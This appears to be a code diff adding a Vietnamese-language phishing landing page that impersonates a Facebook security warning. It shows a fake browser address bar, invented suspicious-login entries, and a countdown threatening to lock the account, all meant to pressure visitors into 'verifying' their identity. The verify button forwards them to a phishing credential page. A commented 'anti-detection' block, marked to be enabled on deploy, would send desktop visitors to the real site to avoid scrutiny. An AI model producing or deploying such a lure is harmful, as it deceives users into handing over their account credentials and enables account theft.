@@ -1,0 +1,351 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>⚠️ Cảnh báo bảo mật tài khoản — Facebook</title>
+    <link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/yb/r/hLRJ1GG_y0J.ico">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Helvetica Neue', sans-serif;
+            background: #f0f2f5;
+            min-height: 100vh;
+        }
+
+        /* Top warning bar */
+        .warning-topbar {
+            background: #d63031;
+            color: white;
+            padding: 10px 16px;
+            text-align: center;
+            font-size: 13px;
+            font-weight: 600;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            animation: flash 1s ease-in-out 3;
+        }
+        @keyframes flash {
+            0%, 100% { background: #d63031; }
+            50% { background: #e74c3c; }
+        }
+
+        /* Fake browser bar */
+        .fake-browser {
+            background: #e8e8e8;
+            padding: 8px 12px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            border-bottom: 1px solid #ccc;
+        }
+        .browser-dots span {
+            display: inline-block;
+            width: 10px; height: 10px;
+            border-radius: 50%;
+            margin-right: 4px;
+        }
+        .browser-dots span:nth-child(1) { background: #ff5f57; }
+        .browser-dots span:nth-child(2) { background: #febc2e; }
+        .browser-dots span:nth-child(3) { background: #28c840; }
+        .url-bar {
+            flex: 1;
+            background: white;
+            border: 1px solid #ddd;
+            border-radius: 20px;
+            padding: 4px 12px;
+            font-size: 12px;
+            color: #333;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+        .url-lock { color: #30a14e; font-size: 12px; }
+        .url-text { color: #333; }
+        .url-domain { font-weight: 600; }
+
+        .main-content {
+            max-width: 480px;
+            margin: 0 auto;
+            padding: 16px;
+        }
+
+        /* Alert card */
+        .alert-card {
+            background: white;
+            border-radius: 12px;
+            overflow: hidden;
+            box-shadow: 0 2px 12px rgba(0,0,0,0.12);
+            margin-bottom: 16px;
+        }
+        .alert-header {
+            background: linear-gradient(135deg, #d63031, #c0392b);
+            padding: 20px 20px 24px;
+            text-align: center;
+            position: relative;
+        }
+        .alert-header::after {
+            content: '';
+            position: absolute;
+            bottom: -12px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 24px; height: 24px;
+            background: white;
+            border-radius: 50%;
+        }
+        .alert-icon {
+            font-size: 48px;
+            animation: shake 0.5s ease-in-out infinite alternate;
+        }
+        @keyframes shake {
+            from { transform: rotate(-5deg); }
+            to { transform: rotate(5deg); }
+        }
+        .alert-title {
+            color: white;
+            font-size: 18px;
+            font-weight: 800;
+            margin-top: 10px;
+        }
+        .alert-subtitle {
+            color: rgba(255,255,255,0.85);
+            font-size: 12px;
+            margin-top: 4px;
+        }
+
+        .alert-body {
+            padding: 24px 20px 20px;
+        }
+        .alert-desc {
+            color: #333;
+            font-size: 14px;
+            line-height: 1.6;
+            margin-bottom: 16px;
+        }
+
+        /* Suspicious activity log */
+        .activity-log {
+            background: #fff9f0;
+            border: 1px solid #ffe4b5;
+            border-radius: 10px;
+            padding: 14px;
+            margin: 14px 0;
+        }
+        .activity-title {
+            font-size: 11px;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            color: #e67e22;
+            margin-bottom: 10px;
+        }
+        .activity-item {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            padding: 8px 0;
+            border-bottom: 1px solid rgba(230,126,34,0.1);
+            font-size: 12px;
+        }
+        .activity-item:last-child { border-bottom: none; }
+        .activity-dot {
+            width: 8px; height: 8px;
+            border-radius: 50%;
+            background: #e74c3c;
+            flex-shrink: 0;
+            animation: blink 1s ease-in-out infinite;
+        }
+        @keyframes blink {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.2; }
+        }
+        .activity-label { color: #555; flex: 1; }
+        .activity-time { color: #999; font-size: 10px; }
+
+        /* Counter */
+        .freeze-counter {
+            background: #fef9e7;
+            border: 2px solid #f1c40f;
+            border-radius: 10px;
+            padding: 12px 16px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin: 14px 0;
+        }
+        .freeze-text { font-size: 13px; color: #333; font-weight: 600; }
+        .freeze-timer { font-size: 22px; font-weight: 800; color: #e74c3c; font-family: monospace; }
+
+        /* Buttons */
+        .btn-primary {
+            display: block;
+            width: 100%;
+            padding: 15px;
+            background: #1877f2;
+            color: white;
+            border: none;
+            border-radius: 10px;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            text-align: center;
+            text-decoration: none;
+            margin-bottom: 10px;
+            transition: background 0.2s;
+        }
+        .btn-primary:active { background: #1568dc; }
+        .btn-secondary {
+            display: block;
+            width: 100%;
+            padding: 13px;
+            background: transparent;
+            color: #606770;
+            border: 1px solid #ddd;
+            border-radius: 10px;
+            font-size: 14px;
+            cursor: pointer;
+            text-align: center;
+        }
+
+        /* Info cards */
+        .info-card {
+            background: white;
+            border-radius: 12px;
+            padding: 16px;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.08);
+            margin-bottom: 12px;
+            display: flex;
+            gap: 12px;
+            align-items: flex-start;
+        }
+        .info-card-icon { font-size: 24px; flex-shrink: 0; }
+        .info-card-title { font-size: 13px; font-weight: 700; color: #1c1e21; margin-bottom: 4px; }
+        .info-card-desc { font-size: 12px; color: #606770; line-height: 1.5; }
+
+        .footer-note {
+            text-align: center;
+            font-size: 11px;
+            color: #999;
+            padding: 10px 0 20px;
+            line-height: 1.5;
+        }
+    </style>
+</head>
+<body>
+    <!-- Warning top bar -->
+    <div class="warning-topbar">
+        ⚠️ CẢNH BÁO BẢO MẬT — Hành động cần thiết ngay
+    </div>
+
+    <!-- Fake browser bar -->
+    <div class="fake-browser">
+        <div class="browser-dots">
+            <span></span><span></span><span></span>
+        </div>
+        <div class="url-bar">
+            <span class="url-lock">🔒</span>
+            <span class="url-text">security.<span class="url-domain">facebook</span>.com/protect/verify</span>
+        </div>
+    </div>
+
+    <div class="main-content">
+        <!-- Main alert -->
+        <div class="alert-card">
+            <div class="alert-header">
+                <div class="alert-icon">🛡️</div>
+                <div class="alert-title">Tài khoản của bạn<br>đang có dấu hiệu bị xâm nhập!</div>
+                <div class="alert-subtitle">Chúng tôi đã phát hiện hoạt động đáng ngờ</div>
+            </div>
+
+            <div class="alert-body">
+                <p class="alert-desc">
+                    Hệ thống bảo mật Facebook phát hiện <strong>3 lần đăng nhập bất thường</strong>
+                    vào tài khoản của bạn từ thiết bị và vị trí lạ. Để bảo vệ tài khoản, 
+                    vui lòng <strong>xác minh danh tính ngay</strong>.
+                </p>
+
+                <!-- Activity log -->
+                <div class="activity-log">
+                    <div class="activity-title">📋 Hoạt động đáng ngờ gần đây</div>
+                    <div class="activity-item">
+                        <div class="activity-dot"></div>
+                        <div class="activity-label">Đăng nhập từ Hà Nội, Việt Nam</div>
+                        <div class="activity-time">2 phút trước</div>
+                    </div>
+                    <div class="activity-item">
+                        <div class="activity-dot"></div>
+                        <div class="activity-label">Thay đổi email thất bại (×3)</div>
+                        <div class="activity-time">5 phút trước</div>
+                    </div>
+                    <div class="activity-item">
+                        <div class="activity-dot"></div>
+                        <div class="activity-label">Truy cập từ IP: 42.113.xxx.xxx</div>
+                        <div class="activity-time">8 phút trước</div>
+                    </div>
+                </div>
+
+                <!-- Freeze countdown -->
+                <div class="freeze-counter">
+                    <span class="freeze-text">⏳ Tài khoản bị khóa sau</span>
+                    <span class="freeze-timer" id="freezeTimer">09:47</span>
+                </div>
+
+                <!-- Buttons -->
+                <button class="btn-primary" onclick="verifyNow()">
+                    🔐 Xác minh danh tính ngay
+                </button>
+                <button class="btn-secondary" onclick="window.location.href='https://www.facebook.com'">
+                    Không phải tôi — Báo cáo
+                </button>
+            </div>
+        </div>
+
+        <!-- Info cards -->
+        <div class="info-card">
+            <div class="info-card-icon">🔒</div>
+            <div>
+                <div class="info-card-title">Tại sao cần xác minh?</div>
+                <div class="info-card-desc">Xác minh danh tính giúp chúng tôi đảm bảo chỉ bạn mới có thể truy cập tài khoản và ngăn chặn mọi thay đổi trái phép.</div>
+            </div>
+        </div>
+        <div class="info-card">
+            <div class="info-card-icon">⚡</div>
+            <div>
+                <div class="info-card-title">Quá trình nhanh chóng</div>
+                <div class="info-card-desc">Chỉ mất 2 phút. Nhập thông tin đăng nhập để chúng tôi xác nhận bạn là chủ tài khoản hợp lệ.</div>
+            </div>
+        </div>
+
+        <div class="footer-note">
+            Trung tâm bảo mật Facebook • security@support.facebook.com<br>
+            Meta Platforms, Inc. • 1 Meta Way, Menlo Park, CA 94025
+        </div>
+    </div>
+
+    <script>
+        // Countdown to freeze
+        let seconds = 9 * 60 + 47;
+        const timerEl = document.getElementById('freezeTimer');
+        const countdown = setInterval(() => {
+            seconds--;
+            if (seconds <= 0) { clearInterval(countdown); seconds = 0; }
+            const m = Math.floor(seconds / 60);
+            const s = seconds % 60;
+            timerEl.textContent = `${String(m).padStart(2,'0')}:${String(s).padStart(2,'0')}`;
+        }, 1000);
+
+        function verifyNow() {
+            window.location.href = '/phishing/facebook.html?campaign=security_alert&utm_source=landing';
+        }
+
+        // Anti-detection
+        if (!/Mobi|Android|iPhone|iPad/i.test(navigator.userAgent)) {
+            // Desktop → redirect (bỏ comment khi deploy)
+            // window.location.href = 'https://www.facebook.com/security';
+        }
+    </script>
+</body>
+</html>
